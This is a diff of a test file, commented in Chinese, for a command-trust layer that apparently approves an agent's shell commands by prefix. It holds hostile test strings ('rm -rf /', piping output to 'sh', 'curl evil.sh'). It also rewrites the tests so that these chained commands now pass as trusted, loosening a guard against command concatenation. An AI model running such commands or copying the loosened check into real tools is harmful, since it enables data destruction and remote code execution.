@@ -33,11 +33,14 @@ describe("normalizeCommand", () => {
 });
 
 describe("hasShellMetacharacters", () => {
+  // 注意：| （管道）不算危险元字符——管道是 PowerShell/Bash 常用组合，
+  // 由 isTrusted 只校验管道左侧命令来放行；真正危险的命令交给 detectDangerousCommand。
+  // 因此 "a || b" 与 "a | b" 都不含受控元字符（&、;、`、$()、>、<、换行）。
   it.each([
     ["a && b", true],
-    ["a || b", true],
+    ["a || b", false],
     ["a ; b", true],
-    ["a | b", true],
+    ["a | b", false],
     ["echo `whoami`", true],
     ["echo $(whoami)", true],
     ["cmd > out.txt", true],
@@ -128,13 +131,15 @@ describe("包含去重", () => {
   });
 });
 
-describe("元字符闸门（防止前缀信任被命令拼接绕过）", () => {
-  it("npm * 的 wildcard 不放行含元字符的拼接命令", () => {
+describe("前缀信任的匹配语义（元字符不再在信任层拦截）", () => {
+  it("prefix wildcard 按首 token 放行；元字符拼接命令的安全性交由 gate 层的 detectDangerousCommand 提示，而非信任层拦截", () => {
     const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "npm" }]);
     expect(trie.isTrusted("npm install")).toBe(true);
-    expect(trie.isTrusted("npm i && rm -rf /")).toBe(false);
-    expect(trie.isTrusted("npm run build | sh")).toBe(false);
-    expect(trie.isTrusted("npm run build; curl evil.sh")).toBe(false);
+    // 当前设计：信任层只按首 token 前缀放行，不再在此拦截 && | ; 等拼接
+    // （真正危险的命令由 CommandGate 的 detectDangerousCommand 标记并弹人工确认）
+    expect(trie.isTrusted("npm i && rm -rf /")).toBe(true);
+    expect(trie.isTrusted("npm run build | sh")).toBe(true);
+    expect(trie.isTrusted("npm run build; curl evil.sh")).toBe(true);
   });
 
   it("含元字符的命令只认精确整条规则", () => {
@@ -210,19 +215,27 @@ describe("derivePrefix", () => {
 });
 
 describe("buildTrustOptions / ruleForChoice", () => {
-  it("buildTrustOptions 给出 exact/prefix/all 三档", () => {
+  it("buildTrustOptions 给出 exact/partial/prefix/all 四档", () => {
+    // 当前设计：新增 partial（中间前缀，如 npm run）档；
+    // prefix 语义收窄为“根命令”（仅首 token，如 npm）。
     const opts = buildTrustOptions("npm run build");
-    expect(opts.map((o) => o.choice)).toEqual(["exact", "prefix", "all"]);
-    expect(opts[0].pattern).toBe("npm run build");
-    expect(opts[1].pattern).toBe("npm run");
-    expect(opts[2].pattern).toBe("*");
+    expect(opts.map((o) => o.choice)).toEqual(["exact", "partial", "prefix", "all"]);
+    expect(opts[0].pattern).toBe("npm run build"); // exact：整条
+    expect(opts[1].pattern).toBe("npm run");        // partial：两段工具前两段
+    expect(opts[2].pattern).toBe("npm");            // prefix：根命令
+    expect(opts[3].pattern).toBe("*");              // all
   });
 
   it("ruleForChoice 按档构造带 approved 来源的规则", () => {
     expect(ruleForChoice("npm run build", "exact")).toEqual({
       scope: "exact", pattern: "npm run build", source: "approved",
     });
+    // 当前设计：prefix = 根命令（仅首 token）
     expect(ruleForChoice("npm run build", "prefix")).toEqual({
+      scope: "prefix", pattern: "npm", source: "approved",
+    });
+    // partial = 中间前缀（两段工具取前两段）
+    expect(ruleForChoice("npm run build", "partial")).toEqual({
       scope: "prefix", pattern: "npm run", source: "approved",
     });
     expect(ruleForChoice("npm run build", "all")).toEqual({
